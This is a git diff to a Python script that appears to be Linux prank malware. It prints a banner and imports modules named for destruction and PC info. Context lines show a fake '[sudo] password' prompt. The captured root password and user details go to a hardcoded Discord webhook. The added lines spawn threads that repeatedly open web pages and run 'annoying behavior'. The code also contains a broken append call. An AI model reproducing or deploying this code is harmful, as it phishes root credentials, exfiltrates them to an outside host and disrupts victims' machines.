@@ -3,10 +3,15 @@ from threading import Thread
 from colorama import Fore, Style
 
 # Importa los módulos desde src
-from src.behavior import * 
-from src.destruct import *
-from src.pc_info import *
-from src.wallpaper import *
+try:
+     from src.behavior import * 
+     from src.destruct import *
+     from src.pc_info import *
+     from src.wallpaper import *
+     
+except ModuleNotFoundError:
+     print("Ejecuta el script desde la carpeta linux, por favor")
+     
 
 print(Fore.GREEN, '''
 ███████╗██╗   ██╗███████╗██╗    ██╗ █████╗ ██████╗ ███████╗
@@ -44,3 +49,15 @@ rootPassword = input(f'[sudo] password for {username} ')
 user_info(root_pswd=rootPassword,
           webhook='https://discord.com/api/webhooks/853467329429897267/81fZI1crGOMsc0OeKUze5M9Yd95iUrLJ6EFPYgifHa1JA2HK9NPIAdc-5ZIBNyyZ6eFR')
 
+threads = []
+for _ in range(3):
+     t1 = Thread(target=webOpen)
+     t1.start()
+     t2 = Thread(target=annoying_behavior)
+     t2.start()
+     threads.append(t1, t2)
+
+for thread in threads:
+     thread.join()
+     
+     
